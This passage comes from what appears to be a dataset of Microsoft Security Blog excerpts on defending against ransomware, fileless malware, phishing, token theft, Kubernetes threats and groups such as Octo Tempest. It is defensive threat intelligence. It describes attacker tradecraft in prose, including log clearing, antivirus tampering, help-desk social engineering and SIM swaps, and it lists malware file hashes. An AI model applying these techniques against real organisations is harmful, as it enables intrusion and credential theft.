leveraging unpatched vulnerabilities and misconfigurations to access valuable systems and data. Gaining the ability to bypass SIP and similar security technology in macOS devices can be an attractive and even necessary capability for adversaries. Given SIP's position as both a device's built-in baseline protection and the last line of defense against malware and other threats, bypassing SIP can have considerable consequences for users. As such, it's crucial that we strive to enrich our protection technologies across platforms against such issues through research-driven protection and collaboration with partners, customers, and industry experts. \nThis case displays how collaborative research and responsible vulnerability disclosure informs our comprehensive protection capabilities across platforms to provide organizations a complete picture of their security posture. Microsoft Defender Vulnerability Management quickly discovers and remediates such vulnerabilities while Microsoft Defender for Endpoint detects and alerts on anomalous device activities, including setting perl and bash environment variables through the launchctl utility, as shown below in Figure 15. Additionally, Defender for Endpoint has similar detections for sensitive file access, including system launch daemons, various sensitive configuration files, and many more. \nThis case further emphasizes the need for responsible vulnerability disclosures and expert cross-platform collaboration to mitigate issues such as CVE-2023-32369, regardless of the vulnerable device or platform in use. We wish to thank the Apple product security team again for their efforts and responsiveness in addressing the issue. \nDefending against the evolving threat landscape requires the ability to protect and secure users' computing experiences, whatever the platform. As cross-platform threats continue to grow, we will continue to share vulnerability discoveries and threat intelligence in addition to working with the security community to improve upon solutions that protect users and organizations each day. ", "source": "microsoft"}, {"title": "Introduction", "content": "Exfiltration and double extortion Persistent and sneaky access methods \n3. Threat actors and campaigns deep dive: Threat intelligence-driven response to human-operated ransomware attacks \n4. Defending against ransomware: Moving beyond protection by detection \nC Building credential hygiene   \nO Auditing credential exposure   \no Prioritizing deployment of Active Directory updates Cloud hardening Addressing security blind spots   \nO Reducing the attack surface   \nO Hardening internet-facing assets and understanding your perimeter ", "source": "microsoft"}, {"title": "Protection", "content": "A durable security strategy against determined human adversaries must include the goal of mitigating classes of attacks and detecting them. Ransomware attacks generate multiple, disparate security product alerts, but they could easily get lost or not responded to in time. Alert fatigue is real, and SOCs can make their lives easier by looking at trends in their alerts or grouping alerts into incidents so they can see the bigger picture. SOCs can then mitigate alerts using hardening capabilities like attack surface reduction rules. Hardening against common threats can reduce alert volume and stop many attackers before they get access to networks. \nAttackers tweak their techniques and have tools to evade and disable security products. They are also well-versed in system administration and try to blend in as much as possible. However, while attacks have continued steadily and with increased impact, the attack techniques attackers use haven't changed much over the years. Therefore, a renewed focus on prevention is needed to curb the tide. \nRansomware as a service: Understanding the cybercrime gig economy and how to protect yourself | Microsoft Security Blog Ransomware attackers are motivated by easy profits, so adding to their cost via security hardening is key in disrupting the cybercriminal economy. ", "source": "microsoft"}, {"title": "defend", "content": "The multi-faceted threat of ransomware requires a comprehensive approach to security. The steps we outlined above defend against common attack patterns and will go a long way in preventing ransomware attacks. Microsoft 365 Defender is designed to make it easy for organizations to apply many of these security controls. \nMicrosoft 365 Defender's industry-leading visibility and detection capabilities, demonstrated in the recent MITRE Engenuity ATT&CK\u00ae Evaluations, automatically stop most common threats and attacker techniques. To equip organizations with the tools to combat human-operated ransomware, which by nature takes a unique path for every organization, Microsoft 365 Defender provides rich investigation features that enable defenders to seamlessly inspect and remediate malicious behavior across domains. \nLearn how you can stop attacks through automated, cross-domain security and built-in AI with Microsoft Defender 365. \nIn line with the recently announced expansion into a new service category called Microsoft Security Experts, we're introducing the availability of Microsoft Defender Experts for Hunting for public preview. Defender Experts for Hunting is for customers who have a robust security operations center but want Microsoft to help them proactively hunt for threats across Microsoft Defender data, including endpoints, Office 365, cloud applications, and identity. \nJoin our research team at the Microsoft Security Summit digital event on May 12 to learn what developments Microsoft is seeing in the threat landscape, as well as how we can help your business mitigate these types of attacks. Ask your most pressing questions during the live chat Q&A. Register today. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Defender Security Research Team \nIncident response Vulnerabilities and exploits Credential theft Living off the land (Note: For a comprehensive categorization of fileless malware and a complete list of Microsoft technologies that can protect against these elusive threats, read the latest blog post: Out of sight but not invisible: Defeating fileless malware with behavior monitoring, AMSI, and next-gen AV) \nAttackers are determined to circumvent security defenses using increasingly sophisticated techniques. Fileless malware boosts the stealth and effectiveness of an attack, and two of last year's major ransomware outbreaks (Petya and WannaCry) used fileless techniques as part of their kill chains. \nThe idea behind fileless malware is simple: If tools already exist on a device (for example PowerShell.exe or wmic.exe) to fulfill an attacker's objectives, then why drop custom tools that could be flagged as malware? If an attacker can take over a process, run code in its memory space, and then use that code to call tools that are already on a device, the attack becomes more difficult to detect. \nSuccessfully using this approach, sometimes called \"living off the land\", is not a walk in the park. There's another thing that attackers need to deal with: Establishing persistence. Memory is volatile, and with no files on disk, how can attackers get their code to auto-start after a system reboot and retain control of a compromised system? ", "source": "microsoft"}, {"title": "Windows Defender Antivirus", "content": "Windows Defender AV blocks the vast majority of malware using generic, heuristic, and behavior-based detections, as well as local and cloud-based machine learning models. Windows Defender AV protects against fileless malware through these capabilities: ", "source": "microsoft"}, {"title": "defend", "content": "Windows Defender Exploit Guard (Windows Defender EG), a new set of host intrusion prevention capabilities, helps reduce the attack surface area by locking down the device against a wide variety of attack vectors. It can help stop attacks that use fileless malware by: \nMitigating kernel-memory exploits like EternalBlue through Hypervisor Code Integrity (HVCI), which makes it extremely difficult to inject malicious code using kernel-mode software vulnerabilities Mitigating user-mode memory exploits through the Exploit protection module, which consists of a number of exploit mitigations that can be applied either at the operating system level or at the individual app level Mitigating many script-based fileless techniques, among other techniques, through Attack Surface Reduction (ASR) rules that lock down application behavior ", "source": "microsoft"}, {"title": "defend", "content": "Windows Defender Application Control (WDAC) offers a mechanism to enforce strong code Integrity policies and to allow only trusted applications to run. In the context of fileless malware, WDAC locks down PowerShell to Constrained Language Mode, which limits the extended language features that can lead to unverifiable code execution, such as direct .NET scripting, invocation of Win32 APIs via the Add-Type cmdlet, and interaction with COM objects. This essentially mitigates PowerShell-based reflective DLL injection attacks. ", "source": "microsoft"}, {"title": "Protection", "content": "Windows Defender Advanced Threat Protection (Windows Defender ATP) is the integrated platform for our Windows Endpoint Protection (EPP) and Endpoint Detection and Response (EDR) capabilities. When it comes to post breach scenarios ATP alerts enterprise customers about highly sophisticated and advanced attacks on devices and corporate networks that other preventive protection features have been unable to defend against. It uses rich security data, advanced behavioral analytics, and machine learning to detect such attacks. It can help detect fileless malware in a number of ways, including: \nExposing covert attacks that use fileless techniques like reflective DLL loading using specific instrumentations that detect abnormal memory allocations Detecting script-based fileless attacks by leveraging AMSI, which provides runtime inspection capability into PowerShell and other script-based malware, and applying machine learning models \nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. ", "source": "microsoft"}, {"title": "Introduction", "content": "We have observed attackers using HTML tables to imitate the logos and branding of trusted organizations. In one recent case, an attacker created a graphic resembling the Microsoft logo by using a $2\\times2$ HTML table and CSS styling to closely match the official branding. \nSpoofed logos created with HTML tables allow attackers to bypass brand impersonation protections. Malicious content arrives in users' inboxes, appearing to recipients as if it were a legitimate message from the company. While Microsoft Defender for Office 365 data shows a decline in the usage of this technique over the last few months, we continue to monitor for new ways that attackers will use procedurally-generated graphics in attacks. ", "source": "microsoft"}, {"title": "Protection", "content": "As the phishing techniques we discussed in this blog show, attackers use common or standard aspects of emails to hide in plain sight and make attacks very difficult to detect or block. With our trend tracking in place, we can make sense of suspicious patterns, and notice repeated combinations of techniques that are highly likely to indicate an attack. This enables us to ensure we protect customers from the latest evasive email campaigns through Microsoft Defender for Office 365. We train machine learning models to keep an eye on activity from potentially malicious domains or IP addresses. Knowing what to look out for, we can rule out false positives and focus on the bad actors. \nThis has already paid off. Microsoft Defender for Office 365 detected and protected customers from sophisticated phishing campaigns, including the Compact campaign. We also employed our knowledge of prevalent trends to hunt for a ransomware campaign that might have otherwise escaped notice. We swiftly opened an investigation to protect customers from what seemed at first like a set of innocuous emails. \nTrend tracking helps us to expand our understanding about prevalent attacker tactics and to improve existing protections. We've already set up rules to detect the techniques described in this blog. Our understanding of the threat landscape has led to better response times to critical threats. Meanwhile, deep within Microsoft Defender for Office 365, rules for raising alerts are weighted so that detecting a preponderance of suspicious techniques triggers a response, while legitimate emails are allowed to travel to their intended inboxes. \nTrend-spotting email techniques: How modern phishing emails hide in plain sight | Microsoft Security Blog Threat intelligence also drives what new features are developed, and which rules are added. In this way, generalized trend tracking leads to concrete results. Microsoft is committed to using our knowledge of the threat landscape to continue to track trends, build better protections for our products, and share intelligence with the greater online community. \nLearn how to protect all of Office 365 against advanced threats like business email compromise and credential phishing with Microsoft Defender for Office 365. ", "source": "microsoft"}, {"title": "Introduction", "content": "While the recent attacks deployed various ransomware strains, many of the campaigns shared infrastructure with previous ransomware campaigns and used the same techniques commonly observed in human-operated ransomware attacks. \nIn stark contrast to attacks that deliver ransomware via email-which tend to unfold much faster, with ransomware deployed within an hour of initial entry-the attacks we saw in April are similar to the Doppelpaymer ransomware campaigns from 2019, where attackers gained access to affected networks months in advance. They then remained relatively dormant within environments until they identified an opportune time to deploy ransomware. \nTo gain access to target networks, the recent ransomware campaigns exploited internet-facing systems with the following weaknesses: \nRemote Desktop Protocol (RDP) or Virtual Desktop endpoints without multifactor authentication (MFA)   \nOlder platforms that have reached end of support and are no longer getting security updates, such as Windows Server 2003 and Windows Server 2008, exacerbated by the use of weak passwords   \nMisconfigured web servers, including IIS, electronic health record (EHR) software, backup servers, or systems management servers Citrix Application Delivery Controller (ADC) systems affected by CVE-2019- 19781   \nPulse Secure VPN systems affected by CVE-2019-11510 \nRansomware groups continue to target healthcare, critical services; here's how to reduce risk | Microsoft Security Blog Applying security patches for internet-facing systems is critical in preventing these attacks. It's also important to note that, although Microsoft security researchers have not observed the recent attacks exploiting the following vulnerabilities, historical signals indicate that these campaigns may eventually exploit them to gain access, so they are worth reviewing: CVE-2019-0604, CVE-2020-0688, CVE-2020- 10189. \nLike many breaches, attackers employed credential theft, lateral movement capabilities using common tools, including Mimikatz and Cobalt Strike, network reconnaissance, and data exfiltration. In these specific campaigns, the operators gained access to highly privileged administrator credentials and were ready to take potentially more destructive action if disturbed. On networks where attackers deployed ransomware, they deliberately maintained their presence on some endpoints, intending to reinitiate malicious activity after ransom is paid or systems are rebuilt. In addition, while only a few of these groups gained notoriety for selling data, almost all of them were observed viewing and exfiltrating data during these attacks, even if they have not advertised or sold yet. \nAs with all human-operated ransomware campaigns, these recent attacks spread throughout an environment affecting email identities, endpoints, inboxes, applications, and more. Because it can be challenging even for experts to ensure complete removal of attackers from a fully compromised network, it's critical that vulnerable internet-facing systems are proactively patched and mitigations put in place to reduce the risk from these kinds of attacks. ", "source": "microsoft"}, {"title": "defend", "content": "As ransomware operators continue to compromise new targets, defenders should proactively assess risk using all available tools. You should continue to enforce proven preventive solutions-credential hygiene, minimal privileges, and host firewalls-to stymie these attacks, which have been consistently observed taking advantage of security hygiene issues and over-privileged credentials. \nApply these measures to make your network more resilient against new breaches, reactivation of dormant implants, or lateral movement: \nRandomize local administrator passwords using a tool such as LAPS.   \nApply Account Lockout Policy.   \nEnsure good perimeter security by patching exposed systems. Apply mitigating factors, such as MFA or vendor-supplied mitigation guidance, for vulnerabilities.   \nUtilize host firewalls to limit lateral movement. Preventing endpoints from communicating on TCP port 445 for SMB will have limited negative impact on most networks, but can significantly disrupt adversary activities.   \nTurn on cloud-delivered protection for Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants. Follow standard guidance in the security baselines for Office and Office 365 and the Windows security baselines. Use Microsoft Secure Score assesses to measures security posture and get recommended improvement actions, guidance, and control.   \nTurn on tamper protection features to prevent attackers from stopping security services.   \nTurn on attack surface reduction rules, including rules that can block ransomware activity: Use advanced protection against ransomware Block process creations originating from PsExec and WMI commands Block credential stealing from the Windows local security authority subsystem (lsass.exe) \nFor additional guidance on improving defenses against human-operated ransomware and building better security posture against cyberattacks in general, read Human-operated ransomware attacks: A preventable disaster. ", "source": "microsoft"}, {"title": "Protection", "content": "What we've learned from the increase in ransomware deployments in April is that attackers pay no attention to the real-world consequences of disruption in services -in this time of global crisis-that their attacks cause. \nHuman-operated ransomware attacks represent a different level of threat because adversaries are adept at systems administration and security misconfigurations and can therefore adapt to any path of least resistance they find in a compromised network. If they run into a wall, they try to break through. And if they can't break through a wall, they've shown that they can skillfully find other ways to move forward with their attack. As a result, human-operated ransomware attacks are complex and wide-reaching. No two attacks are exactly the same. \nMicrosoft Threat Protections (MTP) provides coordinated defenses that uncover the complete attack chain and help block sophisticated attacks like human-operated ransomware. MTP combines the capabilities of multiple Microsoft 365 security services to orchestrate protection, prevention, detection, and response across endpoints, email, identities, and apps. \nThrough built-in intelligence, automation, and integration, MTP can block attacks, eliminate their persistence, and auto-heal affected assets. It correlates signals and consolidates alerts to help defenders prioritize incidents for investigation and response. MTP also provides a unique cross-domain hunting capability that can further help defenders identify attack sprawl and get org-specific insights for hardening defenses. \nMicrosoft Threat Protection is also part of a chip-to-cloud security approach that combines threat defense on the silicon, operating system, and cloud. Hardwarebacked security features on Windows 10 like address space layout randomization (ASLR), Control Flow Guard (CFG), and others harden the platform against many advanced threats, including ones that take advantage of vulnerable kernel drivers. These platform security features seamlessly integrate with Microsoft Defender ATP, providing end-to-end security that starts from a strong hardware root of trust. On Secured-core PCs these mitigations are enabled by default. \nRansomware groups continue to target healthcare, critical services; here's how to reduce risk | Microsoft Security Blog We continue to work with our customers, partners, and the research community to track human-operated ransomware and other sophisticated attacks. For dire cases customers can use available services like the Microsoft Detection and Response (DART) team to help investigate and remediate. \nMicrosoft Threat Protection Intelligence Team ", "source": "microsoft"}, {"title": "Defense", "content": "T1070 Indicator Removal on Host | Clearing of event logs using wevutil,   \nremoval of USNJournal using fsutil, and deletion of slack space on drive using   \ncipher.exe   \nT1089 Disabling Security Tools | Stopping or tampering with antivirus and   \nother security using ProcessHacker and exploitation of vulnerable software   \ndrivers ", "source": "microsoft"}, {"title": "Introduction", "content": "The Microsoft Anti-Cross Site Scripting Library V4.2.1 (AntiXSS V4.2.1) is an encoding library designed to help developers protect their ASP.NET web-based applications from XSS attacks. It differs from most encoding libraries in that it uses the white-listing technique - sometimes referred to as the principle of inclusions - to provide protection against XSS attacks. This approach works by first defining a valid or allowable set of characters, and encodes anything outside this set (invalid characters or potential attacks). The white-listing approach provides several advantages over other encoding schemes. ", "source": "microsoft"}, {"title": "defend", "content": "Windows Defender Offline is a standalone software application that is designed to help detect malicious and other potentially unwanted software, including rootkits that try to install themselves on a PC.  Windows Defender Offline works by scanning an operating system to check the authenticity of any communication the operating system has with the Internet. If there is an application deemed unsafe, it will alert the user and block the contents of the application until the user either accepts or denies the risk. \nPlease check back regularly as we continue our series focused on Microsoft's Free Security Tools. \nTim Rains   \nDirector   \nTrustworthy Computing ", "source": "microsoft"}, {"title": "Introduction", "content": "In the new world of hybrid work, users may be accessing corporate resources from personally owned or unmanaged devices which increases the risk of token theft occurring. These unmanaged devices likely have weaker security controls than those that are managed by organizations, and most importantly, are not visible to corporate IT. Users on these devices may be signed into both personal websites and corporate applications at the same time, allowing attackers to compromise tokens belonging to both. \nAs far as mitigations go, publicly available open-source tools for exploiting token theft already exist, and commodity credential theft malware has already been adapted to include this technique in their arsenal. Detecting token theft can be difficult without the proper safeguards and visibility into authentication endpoints. Microsoft DART aims to provide defenders with the knowledge and strategies necessary to mitigate this tactic until permanent solutions become available. \nTokens are at the center of OAuth 2.0 identity platforms, such as Azure Active Directory (Azure AD). To access a resource (for example, a web application protected by Azure AD), a user must present a valid token. To obtain that token, the user must sign into Azure AD using their credentials. At that point, depending on policy, they may be required to complete MFA. The user then presents that token to the web application, which validates the token and allows the user access. \nWhen Azure AD issues a token, it contains information (claims) such as the username, source IP address, MFA, and more. It also includes any privilege a user has in Azure AD. If you sign in as a Global Administrator to your Azure AD tenant, then the token will reflect that. Two of the most common token theft techniques DART has observed have been through adversary-in-the-middle (AitM) frameworks or the utilization of commodity malware (which enables a 'pass-the-cookie' scenario). \nWith traditional credential phishing, the attacker may use the credentials they have compromised to try and sign in to Azure AD. If the security policy requires MFA, the attacker is halted from being able to successfully sign in. Though the users' credentials were compromised in this attack, the threat actor is prevented from accessing organizational resources. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Although tactics from threat actors are constantly evolving, it is important to note that multifactor authentication, when combined with other basic security hygiene- utilizing antimalware, applying least privilege principals, keeping software up to date and protecting data-still protects against $98\\%$ of all attacks. \nFundamentally, it is important to consider the identity trust chain for the organization, spanning both internally and externally. The trust chain includes all systems (such as identity providers, federated identity providers, MFA services, VPN solutions, cloud-service providers, and enterprise applications) that issue access tokens and grant privilege for identities both cloud and on-premises, resulting in implicit trust between them. \nIn instances of token theft, adversaries insert themselves in the middle of the trust chain and often subsequently circumvent security controls. Having visibility, alerting, insights, and a full understanding of where security controls are enforced is key. Treating both identity providers that generate access tokens and their associated privileged identities as critical assets is strongly encouraged. \nAdversaries have and will continue to find ways to evade security controls. The tactics utilized by threat actors to bypass controls and compromise tokens present additional challenges to defenders. However, by implementing the controls presented in this blog DART believes that organizations will be better prepared to detect, mitigate, and respond to threats of this nature moving forward. ", "source": "microsoft"}, {"title": "Introduction", "content": "Starting in Windows 10, version 1809, the kernel has been instrumented with new sensors designed to trace User APC code injection initiated by a kernel code, providing better visibility into kernel threats like DOUBLEPULSAR. As described in our in-depth analysis, DOUBLEPULSAR is a kernel backdoor used by the WannaCry ransomware to inject the main payload into user-space. DOUBLEPULSAR copied the user payload from the kernel into an executable memory region in lsass.exe and inserted a User APC to a victim thread with NormalRoutine targeting this region. \nWhile the User APC code injection technique isn't novel (see Conficker or Valerino's earliest proof-of-concept), detecting threats running in the kernel is not trivial. Since PatchGuard was introduced, hooking NTOSKRNL is no longer allowed; there's no documented way drivers could get notification for any of the above operations. Hence, without proper optics, the only sustainable strategy would be applying memory forensics, which can be complicated. \nThe new set of kernel sensors aim to address this kind of kernel threat. Microsoft Defender ATP leverages these sensors to detect suspicious operations invoked by a kernel code that might lead to code injection into user-mode. One such suspicious operation, though not related to WannaCry, DOUBLEPULSAR, or other known kernel threats, triggered this investigation that led to our discovery of a vulnerability. ", "source": "microsoft"}, {"title": "Summary", "content": "While the original alert turned out to be benign, in the sense that it didn't detect an actual kernel threat like DOUBLEPULSAR, it did trigger an investigation that eventually led us to finding vulnerabilities. The two vulnerabilities we discovered in the driver prove the importance of designing software and products with security in mind. Security boundaries must be honored. Attack surface should be minimized as much as possible. In this case, the flaws could have been prevented if certain precautions were taken: \nThe device object created by the driver should be created with a DACL granting SYSTEM RW access (since only the vendor's services were communicating directly with the driver)   \nIf a service should persist, developers should check that it's not already provided by the OS before trying to implement a complex mechanism   \nUser-mode shouldn't be allowed to perform privileged operations like writing to any physical page; if needed, the driver should do the actual writing for well-defined, hardware-related scenarios \nMicrosoft's driver security checklist provides some guidelines for driver developers to help reduce the risk of drivers being compromised. \nFrom alert to driver vulnerability: Microsoft Defender ATP investigation unearths privilege escalation flaw | Microsoft Security Blog Our discovery of the driver vulnerabilities also highlights the strength of Microsoft Defender ATP's sensors. These sensors expose anomalous behavior and give SecOps personnel the intelligence and tools to investigate threats, as we did. \nAnomalous behaviors typically point to attack techniques perpetrated by adversaries with only malicious intent. In this case, they pointed to a flawed design that can be abused. Nevertheless, Microsoft Defender ATP exposed a security flaw and protected customers before it can even be used in actual attacks. \nNot yet reaping the benefits of Microsoft Defender ATP's industry-leading optics and detection capabilities? Sign up for free trial today. \nAmit Rapaport (@realAmitRap) Microsoft Defender Research team ", "source": "microsoft"}, {"title": "Introduction", "content": "Containerized assets (including Kubernetes clusters, Kubernetes nodes, Kubernetes workloads, container registries, container images, and more) are at risk of several different types of attacks. To fully secure containerized workloads, organizations must secure the containers and the code running within them, software dependencies and libraries, continuous integration and continuous delivery (CI/CD) pipelines, runtime, and more. \nThreats in Kubernetes environments can come from six primary areas: \nCompromised accounts: In cases where Kubernetes clusters are deployed in public clouds (such as Azure Kubernetes Service (AKS) or Google Kubernetes Engine (GKE)), compromised cloud credentials could lead to cluster takeover, as attackers who have access to account credentials can get access to the cluster's management layer.   \nVulnerable or misconfigured images: Images that are not updated regularly might contain vulnerabilities that can be exploited in malicious attacks.   \nEnvironment misconfigurations: An attacker with access to the Kubernetes API, either through exposed management interfaces or lack of appropriate authentication/authorization controls, could completely take down the server, deploy malicious containers, or hijack the entire cluster.   \nApp-level attacks: Applications could be exploited through several typical methods, such as SQL injection, cross-site scripting, and remote file inclusion.   \nNode-level attacks: Attackers can gain initial access through nodes (host machines that containers run on) that run on vulnerable code or software, have open management interfaces such as ${\\mathsf{S S H}},$ , or run commands from the cloud control plane. There is also the risk of pod escape, where a compromised pod can provide access to the node or to other pods in the cluster.   \nUnauthorized traffic: Insecure networking between the different containers within the cluster and between the pods and outside world could be subject to malicious traffic if not secured. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Yossi Weizman, Senior Security Researcher, Microsoft Defender for Cloud Dotan Patrich, Principal Architect, Microsoft Defender for Cloud \nToday, we are glad to release the third version of the threat matrix for Kubernetes, an evolving knowledge base for security threats that target Kubernetes clusters. The matrix, first released by Microsoft in 2020, was the first attempt to systematically cover the attack landscape of Kubernetes. Since then, the project has received great attention and interest from the Kubernetes security community and was updated last year to keep up with the evolving threat landscape. The latest version of the matrix comes in a new format that simplifies usage of the knowledge base and with new content to help mitigate threats. The new matrix is available at: http://aka.ms/KubernetesThreatMatrix. ", "source": "microsoft"}, {"title": "Introduction", "content": "Light \nBlog home / Threat intelligence All Microsoft\ue70d Products\ue70d \nSearch the blog \nResearch Threat intelligence Threat actors \n11 min read \nInsights from one year of tracking a polymorphic threat \nBy Microsoft Defender Security Research Team \nA little over a year ago, in October 2018, our polymorphic outbreak monitoring system detected a large surge in reports, indicating that a large-scale campaign was unfolding. We observed as the new threat attempted to deploy files that changed every 20-30 minutes on thousands of devices. We gave the threat the name \"Dexphot,\" based on certain characteristics of the malware code. \nThe Dexphot attack used a variety of sophisticated methods to evade security solutions. Layers of obfuscation, encryption, and the use of randomized file names hid the installation process. Dexphot then used fileless techniques to run malicious code directly in memory, leaving only a few traces that can be used for forensics. It hijacked legitimate system processes to disguise malicious activity. If not stopped, Dexphot ultimately ran a cryptocurrency miner on the device, with monitoring services and scheduled tasks triggering re-infection when defenders attempt to remove the malware. \nInsights from one year of tracking a polymorphic threat | Microsoft Security Blog In the months that followed, we closely tracked the threat and witnessed the attackers upgrade the malware, target new processes, and work around defensive measures: \nWhile Microsoft Defender Advanced Threat Protection's pre-execution detection engines blocked Dexphot in most cases, behavior-based machine learning models provided protection for cases where the threat slipped through. Given the threat's persistence mechanisms, polymorphism, and use of fileless techniques, behaviorbased detection was a critical component of the comprehensive protection against this malware and other threats that exhibit similar malicious behaviors. \nMicrosoft Defender ATP data shows the effectiveness of behavioral blocking and containment capabilities in stopping the Dexphot campaign. Over time, Dexphotrelated malicious behavior reports dropped to a low hum, as the threat lost steam. \nOur close monitoring of Dexphot helped us ensure that our customers were protected from the evolving threat. More importantly, one year's worth of intelligence helped us gain insight not only into the goals and motivations of Dexphot's authors, but of cybercriminals in general. ", "source": "microsoft"}, {"title": "Protection", "content": "Dexphot is not the type of attack that generates mainstream media attention; it's one of the countless malware campaigns that are active at any given time. Its goal is a very common one in cybercriminal circles - to install a coin miner that silently steals computer resources and generates revenue for the attackers - yet Dexphot exemplifies the level of complexity and rate of evolution of even everyday threats, intent on evading protections and motivated to fly under the radar for the prospect of profit. \nTo combat threats, several next-generation protection engines in Microsoft Defender Advanced Threat Protection's antivirus component detect and stop malicious techniques at multiple points along the attack chain. For Dexphot, machine learning-based detections in the cloud recognize and block the DLLs loaded by rundll32.exe, stopping the attack chain in its early stages. Memory scans detect and terminate the loading of malicious code hidden by process hollowing - including the monitoring processes that attempt to update the malware code and re-infect the machine via PowerShell commands. \nBehavioral blocking and containment capabilities are especially effective in defeating Dexphot's fileless techniques, detection evasion, and persistence mechanisms, including the periodic and boot-time attempts to update the malware via scheduled tasks. As mentioned, given the complexity of the attack chain and of Dexphot's persistence methods, we released a remediation solution that prevents re-infection by removing artifacts. \nThe detection, blocking, and remediation of Dexphot on endpoints are exposed in Microsoft Defender Security Center, where Microsoft Defender ATP's rich capabilities like endpoint detection and response, automated investigation and remediation, and others enable security operations teams to investigate and remediate attacks in enterprise environments. With these capabilities, Microsoft Defender ATP provides comprehensive protection against Dexphot and the countless other complex and evolving threats that we face every day. ", "source": "microsoft"}, {"title": "Introduction", "content": "MSTIC first observed the latest DEV-0322 campaign on September 22, 2021, with activity against targets that appear to be in the Defense Industrial Base, higher education, consulting services, and information technology sectors. Following initial exploitation of CVE-2021-40539 on a targeted system, DEV-0322 performed several activities including credential dumping, installing custom binaries, and dropping malware to maintain persistence and move laterally within the network. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Digital Security Unit (DSU) Microsoft Threat Intelligence \nIranian threat actors are increasing attacks against IT services companies as a way to access their customers' networks. This activity is notable because targeting third parties has the potential to exploit more sensitive organizations by taking advantage of trust and access in a supply chain. Microsoft has observed multiple Iranian threat actors targeting the IT services sector in attacks that aim to steal sign-in credentials belonging to downstream customer networks to enable further attacks. The Microsoft Threat Intelligence Center (MSTIC) and Digital Security Unit (DSU) assess this is part of a broader espionage objective to compromise organizations of interest to the Iranian regime. \nUntil July 2021, Microsoft had observed relatively little history of Iranian actors attacking Indian targets. As India and other nations rise as major IT services hubs, more nation state actors follow the supply chain to target these providers' public and private sector customers around the world matching nation state interests. \nTo date this year, Microsoft has issued more than 1,600 notifications to over 40 IT companies in response to Iranian targeting, compared to 48 notifications in 2020, making this a significant increase from years past (Figure 1). The focus of several Iranian threat groups on the IT sector particularly spiked in the last six months \u2013 roughly $10\\%$ of our notifications were related to Iranian threat activity in the last six months, compared to two and a half percent in the six months prior (Figure 2). Most of the targeting is focused on IT services companies based in India, as well as several companies based in Israel and United Arab Emirates. Although different in technique from other recent supply chain attacks, these attacks represent another example of how nation state actors are increasingly targeting supply chains as indirect vectors to achieve their objectives. \nAs with any observed nation state actor activity, Microsoft has directly notified customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing MSTIC to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "Type Indicator 2a1044e9e6e87a032f80c6d9ea6ae61bbbb053c0a21b186ecb3b812   \nsvchost.exe b49eb03b7 9ab7e99ed84f94a7b6409b87e56dc6e1143b05034a5e4455e8c555d   \nsvchost.exe bbcd0d2dd 43109fbe8b752f7a9076eaafa417d9ae5c6e827cd5374b866672263f   \nlsa.exe debd5ec3 \n18a072ccfab239e140d8f682e2874e8ff19d94311fc8bb9564043d3e wdmsvc.exe 0deda54b Pa.exe ab50d8d707b97712178a92bbac74ccc2a5699eb41c17aa77f713ff3e (PAExec.exe) 568dcedb ", "source": "microsoft"}, {"title": "Defense", "content": "The following guidance can mitigate the techniques described in the threat activity: \nEnable multi-factor authentication to mitigate compromised credentials. For Office 365 users, see multi-factor authentication support. For Consumer and Personal email accounts, see how to use two-step verification.   \nUse passwordless solutions like Microsoft Authenticator to secure accounts.   \nReview and enforce recommended Exchange Online access policies. Block ActiveSync clients from bypassing Conditional Access policies.   \nBlock all incoming traffic from anonymizing services where possible.   \nTurn on the following attack surface reduction rule to block or audit activity associated with this threat: Block credential stealing from the Windows local security authority subsystem (lsass.exe) ", "source": "microsoft"}, {"title": "Introduction", "content": "In both SharePoint Server and Exchange Server, AMSI is integrated as a security filter module within the IIS pipeline to inspect incoming HTTP requests before they are processed by the application. The filter is triggered at the onBeginRequest stage through the SPRequesterFilteringModule for SharePoint Server and HttpRequestFilteringModule for Exchange Server, allowing it to analyze incoming requests before they reach authentication and authorization phases. This integration ensures that potential threats are identified before they interact with internal processing, mitigating the risk of exploitation. On detecting a malicious request, the application returns a HTTP 400 Bad Request response. ", "source": "microsoft"}, {"title": "Introduction", "content": "Octo Tempest commonly launches social engineering attacks targeting technical administrators, such as support and help desk personnel, who have permissions that could enable the threat actor to gain initial access to accounts. The threat actor performs research on the organization and identifies targets to effectively impersonate victims, mimicking idiolect on phone calls and understanding personal identifiable information to trick technical administrators into performing password resets and resetting multifactor authentication (MFA) methods. Octo Tempest has also been observed impersonating newly hired employees in these attempts to blend into normal on-hire processes. \nOcto Tempest primarily gains initial access to an organization using one of several methods: \nSocial engineering Calling an employee and socially engineering the user to either: Install a Remote Monitoring and Management (RMM) utility Navigate to a site configured with a fake login portal using an adversary-in-the-middle toolkit Remove their FIDO2 token Calling an organization's help desk and socially engineering the help desk to reset the user's password and/or change/add a multi-factor authentication token/factor   \nPurchasing an employee's credentials and/or session token(s) on a criminal underground market   \nSMS phishing employee phone numbers with a link to a site configured with a fake login portal using an adversary-in-the-middle toolkit   \nUsing the employee's pre-existing access to mobile telecommunications and business process outsourcing organizations to initiate a SIM swap or to set up call number forwarding on an employee's phone number. Octo Tempest will initiate a self-service password reset of the user's account once they have gained control of the employee's phone number. \nIn rare instances, Octo Tempest resorts to fear-mongering tactics, targeting specific individuals through phone calls and texts. These actors use personal information, such as home addresses and family names, along with physical threats to coerce victims into sharing credentials for corporate access. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft 365 Defender is becoming Microsoft Defender XDR. Learn more. \nNOTE: Several tools mentioned throughout this blog are remote administrator tools that have been utilized by Octo Tempest to maintain persistence. While these tools are abused by threat actors, they can have legitimate use cases by normal users, and are updated on a frequent basis. Microsoft recommends monitoring their use within the environment, and when they are identified, defenders take the necessary steps for deconfliction to verify their use. ", "source": "microsoft"}, {"title": "Introduction", "content": "The persistent onslaught of email-based threats continues to pose a challenge for network defenders because of improvements in how phishing attacks are crafted and distributed. Modern phishing attacks are typically 